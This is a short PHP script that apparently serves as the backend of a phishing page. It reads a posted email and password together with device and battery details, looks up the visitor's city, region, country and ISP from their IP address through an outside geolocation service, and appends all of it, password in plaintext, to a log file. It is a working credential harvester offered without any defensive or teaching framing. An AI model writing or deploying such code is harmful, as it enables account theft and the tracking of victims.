<?php
// Collect form inputs
$email = $_POST['email'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';
$battery = $_POST['battery'] ?? 'Unknown';
$device = $_POST['device'] ?? 'Unknown';
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("Y-m-d H:i:s");

// Get location info
$locationData = @file_get_contents("http://ip-api.com/json/$ip");
$location = json_decode($locationData, true);
$country = $location['country'] ?? 'Unknown';
$region = $location['regionName'] ?? 'Unknown';
$city = $location['city'] ?? 'Unknown';
$isp = $location['isp'] ?? 'Unknown';

$log = "===== LOGIN EVENT =====\n";
$log .= "📧 Email: $email\n";
$log .= "🔑 Password: $password\n";
$log .= "🔋 Battery: $battery\n";
$log .= "📱 Device: $device\n";
$log .= "🌐 IP: $ip\n";
$log .= "📍 Location: $city, $region, $country\n";
$log .= "📡 ISP: $isp\n";
$log .= "🕒 Time: $date\n";
$log .= "=========================\n\n";

// Save to one file
file_put_contents("logins.txt", $log, FILE_APPEND);
?>

